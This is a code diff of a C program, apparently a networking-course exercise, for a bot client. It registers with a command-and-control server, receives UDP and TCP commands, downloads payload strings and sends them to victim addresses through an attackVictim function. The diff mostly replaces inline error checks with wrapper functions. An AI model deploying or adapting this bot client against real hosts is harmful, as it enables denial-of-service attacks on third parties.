@@ -9,11 +9,10 @@
 #include <err.h>
 #include <arpa/inet.h>
 #include <netdb.h>
-
+#include "wrapper.h"
 #define MAXLEN 1024
 #define S_PORT 5555
 
-in_port_t getport(struct sockaddr *sa);
 int attackVictim(char *ip, char *port, char *buf, int sock);
 
 int main (int argc, char *argv[]){
@@ -32,6 +31,11 @@ int main (int argc, char *argv[]){
     struct addrinfo hints, *res;
     char *regmsg = "REG\n"; 
     char *helmsg = "HELLO\n";
+    
+    fd_set readfds;
+    struct timeval tv;
+	tv.tv_sec = 1;
+	tv.tv_usec = 0;
 
     struct ipport {
         char IP[INET_ADDRSTRLEN];
@@ -56,8 +60,7 @@ int main (int argc, char *argv[]){
     
 	char payloads[100][100];
 	
-	fd_set readfds;
-    struct timeval tv;
+	
 
     // Inicijalizacija socketa i bindanje adrese
 
@@ -66,14 +69,11 @@ int main (int argc, char *argv[]){
     hints.ai_socktype = SOCK_DGRAM;
     hints.ai_flags = AI_PASSIVE;
 
-    gs = getaddrinfo(NULL, "5555", &hints, &res);
-    if(gs == -1){
-        errx(1, "Getaddrinfo error.");
-    }
-
-    mysock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+    Getaddrinfo(NULL, "5555", &hints, &res);
+    
+    mysock = Socket(res->ai_family, res->ai_socktype, res->ai_protocol);
 	
-    bind(mysock,res->ai_addr, res->ai_addrlen);
+    Bind(mysock,res->ai_addr, res->ai_addrlen);
     
     // Attack sock
     
@@ -82,14 +82,11 @@ int main (int argc, char *argv[]){
     hints.ai_socktype = SOCK_DGRAM;
     hints.ai_flags = AI_PASSIVE;
 
-    gs = getaddrinfo(NULL, "6666", &hints, &res);
-    if(gs == -1){
-        errx(1, "Getaddrinfo error.");
-    }
+    Getaddrinfo(NULL, "6666", &hints, &res);
 
-    attsock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+    attsock = Socket(res->ai_family, res->ai_socktype, res->ai_protocol);
 	
-    bind(attsock,res->ai_addr, res->ai_addrlen);
+    Bind(attsock,res->ai_addr, res->ai_addrlen);
 
     // Slanje REG poruke na CandC server
 
@@ -98,24 +95,21 @@ int main (int argc, char *argv[]){
     to.sin_addr.s_addr = inet_addr(argv[1]);
     to.sin_port = htons(atoi(argv[2]));
 
-    sentbytes = sendto(mysock, (const char*)regmsg, strlen(regmsg), 0, (struct sockaddr*)&to, sizeof(to));
-    if(sentbytes == -1){
-        errx(1, "Sento error.");
-    } 
+    sentbytes = Sendto(mysock, (const char*)regmsg, strlen(regmsg), 0, (struct sockaddr*)&to, sizeof(to));
+    
     printf("SENT REG message (%d bytes) to %s:%s.\n", sentbytes, argv[1], argv[2]);
     printf("\n");
     
     while(1){
-        recbytes = recvfrom(mysock, &MSG, sizeof(MSG), 0, &cli, &clilen);
-        if(recbytes == -1){
-            errx(1, "Recvfrom error. here");
-        }
+        recbytes = Recvfrom(mysock, &MSG, sizeof(MSG), 0, &cli, &clilen);
+        
         printf("RECEIVED MSG %c (%d bytes) from %s:%s.\n", MSG.command, recbytes, argv[1], argv[2]);
         printf("\n");
 
         if(MSG.command == '0'){
 			
-			return 0;	
+			printf("Quitting!");
+			exit(1);	
 
         } else if(MSG.command == '1') {
     
@@ -125,25 +119,16 @@ int main (int argc, char *argv[]){
 			hints.ai_protocol = 0;
 			hints.ai_flags |= AI_CANONNAME;
 
-			if ((error = getaddrinfo(MSG.addresses[0].IP, MSG.addresses[0].PORT, &hints, &res)))
-				errx(1, "%s", gai_strerror(error));
+			Getaddrinfo(MSG.addresses[0].IP, MSG.addresses[0].PORT, &hints, &res);
 			
-			if ((sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) == -1) {
-				err(1,"socket");
-			}
+			sockfd = Socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+				
+			Connect(sockfd,res->ai_addr,res->ai_addrlen);
 
-			if (connect(sockfd,res->ai_addr,res->ai_addrlen) == -1) {
-				err(1,"connect");
-			}
-
-			if(send(sockfd, helmsg, strlen(helmsg), 0) == -1){
-				err(1, "send");
-			}
+			Send(sockfd, helmsg, strlen(helmsg), 0);
 			
 			memset(&buf, 0, sizeof(buf));
-			if((numbytes = recv(sockfd, buf, MAXLEN, 0)) == -1){
-				err(1, "recv");
-			}
+			Recv(sockfd, buf, MAXLEN, 0);
 			printf("RECEIVED: %s\n", buf);
 			
 			p = 0;
@@ -185,18 +170,14 @@ int main (int argc, char *argv[]){
             to.sin_addr.s_addr = inet_addr(MSG.addresses[0].IP);
             to.sin_port = htons(atoi(MSG.addresses[0].PORT));
 
-            sentbytes = sendto(mysock, (const char*)helmsg, strlen(helmsg), 0, (struct sockaddr*)&to, sizeof(to));
-            if(sentbytes == -1){
-                errx(1, "Sento UDP_server error.");
-            } 
+            Sendto(mysock, (const char*)helmsg, strlen(helmsg), 0, (struct sockaddr*)&to, sizeof(to));
+            
             printf("SENT HELLO (%d bytes) to UDP_server %s:%s.\n", sentbytes, MSG.addresses[0].IP, MSG.addresses[0].PORT);
             printf("\n");
 
             memset(buf, 0, sizeof(buf));
-            recbytes = recvfrom(mysock, buf, sizeof(buf), 0, &cli, &clilen);
-            if(recbytes == -1){
-                errx(1, "Recvfrom error.");
-            }
+            Recvfrom(mysock, buf, sizeof(buf), 0, &cli, &clilen);
+            
             printf("RECEIVED: %s\n", buf);
             
             p = 0;
@@ -236,10 +217,7 @@ int main (int argc, char *argv[]){
 			} else {
 				n = mysock + 1;
 			}
-			
-			tv.tv_sec = 1;
-			tv.tv_usec = 0;
-			
+						
 			p = 0;
 			
 			for(i = 0; i < 100; i++){	
@@ -259,7 +237,7 @@ int main (int argc, char *argv[]){
 					FD_SET(mysock, &readfds);
 					FD_SET(attsock, &readfds);
 					
-					rv = select(n, &readfds, NULL, NULL, &tv);
+					rv = Select(n, &readfds, NULL, NULL, &tv);
 					
 					if(rv == -1){
 						errx(1, "%s", gai_strerror(rv));
@@ -269,7 +247,7 @@ int main (int argc, char *argv[]){
 						if(FD_ISSET(mysock, &readfds)){
 							
 							memset(&buf, 0, sizeof(buf));
-							recbytes = recvfrom(mysock, &trashbuf, sizeof(trashbuf), 0, &cli, &clilen);
+							recbytes = Recvfrom(mysock, &trashbuf, sizeof(trashbuf), 0, &cli, &clilen);
 								
 							if(recbytes != -1){			
 									if(strncmp(trashbuf, "4", 1) == 0){
@@ -281,7 +259,7 @@ int main (int argc, char *argv[]){
 						
 						if(FD_ISSET(attsock, &readfds)){
 							memset(&trashbuf, 0, sizeof(trashbuf));
-							recbytes = recvfrom(attsock, &trashbuf, sizeof(trashbuf), 0, &cli, &clilen);
+							recbytes = Recvfrom(attsock, &trashbuf, sizeof(trashbuf), 0, &cli, &clilen);
 								
 							if(recbytes != -1){
 								break;
@@ -323,13 +301,12 @@ int attackVictim(char *ip, char *port, char *buf, int sock){
 	hints.ai_protocol = IPPROTO_UDP;
 	hints.ai_family = AF_INET;
 
-	error = getaddrinfo(ip, port, &hints, &res);
-	if (error) return 0;
+	Getaddrinfo(ip, port, &hints, &res);
 	
 	memset(&to, 0, sizeof(to));
 	to.sin_family = AF_INET;
 	to.sin_addr.s_addr = ((struct sockaddr_in*)res->ai_addr)->sin_addr.s_addr;
-	to.sin_port = getport((struct sockaddr *)res->ai_addr);
+	to.sin_port = ((struct sockaddr_in *)res->ai_addr)->sin_port;
 	
 	sentbytes = sendto(sock, buf, strlen(buf), 0, (struct sockaddr*)&to, sizeof(to));
 	
@@ -340,13 +317,6 @@ int attackVictim(char *ip, char *port, char *buf, int sock){
 	}
 
     return sentbytes;
-}
-
-in_port_t getport(struct sockaddr *sa){
-    if (sa->sa_family == AF_INET) {
-        return (((struct sockaddr_in*)sa)->sin_port);
-    }
-    return (((struct sockaddr_in6*)sa)->sin6_port);
 }
 
 
